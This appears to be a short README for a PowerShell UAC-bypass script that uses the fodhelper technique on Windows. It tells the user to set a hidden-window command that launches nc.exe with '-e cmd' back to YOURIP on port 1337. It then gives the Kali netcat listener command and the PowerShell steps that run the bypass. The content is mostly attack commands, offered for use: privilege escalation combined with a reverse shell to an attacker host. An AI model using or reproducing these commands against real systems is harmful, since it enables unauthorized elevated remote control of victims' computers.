# Bypass UAC 

### Method 1
Before importing the file, please edit the "**BypassUACfodhelper_1.ps1**" file in the following section:: 

```
$CMD = "powershell -windowstyle hidden C:\Windows\Temp\nc.exe YOURIP 1337 -e cmd"
```

Execute:
```
Windows (Poweshell)> . .\BypassUACfodhelper_1.ps1

kali@unix:/$ rlwrap nc -lvp 1337

Windows (Poweshell)> UACBypass
```
